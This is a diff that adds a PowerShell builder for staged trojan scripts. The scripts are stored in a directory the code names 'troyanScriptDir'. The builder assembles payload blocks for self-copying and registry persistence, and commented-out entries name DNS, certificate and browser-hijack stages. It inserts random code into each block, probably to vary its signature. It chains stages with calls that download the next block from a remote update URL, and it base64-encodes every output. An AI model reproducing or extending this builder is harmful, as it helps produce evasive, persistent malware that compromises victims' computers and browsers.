@@ -61,3 +61,182 @@ function ReRun {
 #   }
 # }
  $generalJob = Start-Job -ScriptBlock {
+
+
+
+
+function BuldScript { param ([bool]$random)
+
+    function get{
+    param ([string]$name)
+    
+        $fn =Join-Path -Path $server.troyanScriptDir -ChildPath ($name + ".ps1")
+        $contentBytes = [System.IO.File]::ReadAllBytes($fn)
+        $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
+        return  "`n`n" + $contentWithoutBom +  "`n`n"
+    }
+
+    $pref = '
+
+        function writedbg2 {
+                param (
+                    [string]$msg,   [string]$msg2=""
+                )
+            }
+            '
+
+    $suff = '
+
+    ';
+
+    $clean=""
+    if ($random -eq $false)
+    {
+        $clean=".c"
+    }
+
+    $utils = get -name "utils"
+    $consts_body = get -name "consts_body"
+    $consts_embeddings = get -name "consts_embeddings"
+    $consts_cert = get -name "consts_cert"
+
+    function rnd {
+        if ($random -eq $true)
+        {
+            return Generate-RandomCode
+        }
+        return ""
+    }
+
+    function make
+    {
+        param ([object]$cur, [object]$next)
+
+        $fn = $cur.block
+        $base = $server.updateUrlBlock
+        $isJob = "`$false"
+        if ($next.isJob){
+              $isJob = "`$true"
+        }
+        $isWait = "`$false"
+        if ($next.isWait){
+            $isWait = "`$true"
+        }
+        $nextBlock = $next.block
+
+        $fileContent =""
+
+        if ($fn -eq "holder")
+        {
+        
+            $rew = "
+
+. ./consts_body.ps1
+. ./utils.ps1
+
+"
+            Utf8NoBom -data $rew -file (Join-Path -Path $server.troyanScriptDir -ChildPath "holder.ps1")
+        }
+
+        $fileContent = (get -name $fn)
+        
+        if ($fn -ne "holder")
+        {
+            $fileContent +=  "
+            
+                ###GENERATED
+                do_$fn
+                
+            ";
+        }
+        if ($null -ne $nextblock -and $nextblock -ne "")
+        {
+            $fileContent +=  "
+    
+            ###GENERATED
+            RunRemote -baseUrl '$base' -isJob $isJob -isWait $isWait -block '$nextblock'
+            
+            ";
+        }
+
+        if ($fn -eq "holder")
+        {
+            $tarSrc=(Join-Path -Path $server.troyanScriptDir -ChildPath "holder.ps1")
+            Utf8NoBom -data $fileContent -file $tarSrc
+        }
+
+
+        $fileContent = $fileContent -replace "\.\s+\./[^/]+\.ps1", "`n`n"
+        $fileContent = $pref + (rnd) + $utils + (rnd) + $consts_body + (rnd) + $fileContent + $suff
+        
+        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ($fn + "$clean.ps1")
+        if ($fn -eq "embeddings")
+        {
+            $fileContent = $consts_embeddings +  $fileContent
+        }
+        elseif ($fn -eq "cert")
+        {
+            $fileContent = $consts_cert +  $fileContent
+        }
+
+        Utf8NoBom -data $fileContent -file $outFile
+
+        $encoded = Encode-FileToBase64 -inFile $outFile
+        $outFile = Join-Path -Path $server.troyanOutputBlock -ChildPath ([System.IO.Path]::ChangeExtension($fn, ".txt"))
+        Utf8NoBom -data $encoded -file $outFile
+    }
+
+    $units = @(
+        [PSCustomObject]@{ block = "holder"; isJob = $true; isWait = $true},
+
+        [PSCustomObject]@{ block = "autocopy"; isJob = $true; isWait = $true },
+
+        [PSCustomObject]@{ block = "autoregistry"; isJob = $true; isWait = $true}
+
+
+        # [PSCustomObject]@{ block = "dnsman"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "cert"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "chrome"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "edge"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "yandex"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "firefox"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "opera"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "chrome_ublock"; isJob = $true; isWait = $false }
+        
+        # [PSCustomObject]@{ block = "chrome_push"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "tracker"; isJob = $true; isWait = $false }
+
+        # [PSCustomObject]@{ block = "extraupdate"; isJob = $true; isWait = $false }
+    )
+    
+
+    for ($no = 0; $no -lt $units.Length; $no++)
+    {
+        $cur = $units[$no]
+        $next = if ($no + 1 -lt $units.Count) { $units[$no + 1] } else { $null }
+        if ($cur.isStop)
+        {
+            $next = $null
+        }
+
+        Write-Output "Iteration $no :"
+        Write-Output "Current: Block = $($cur.block), isJob = $($cur.isJob), isWait = $($cur.isWait)"
+        if ($null -ne $next) {
+            Write-Output "Next: Block = $($next.block), isJob = $($next.isJob), isWait = $($next.isWait)"
+        } else {
+            Write-Output "Next: None"
+        }
+        
+        make -cur $cur, -next $next 
+        
+        Write-Output "----"
+    }
+}
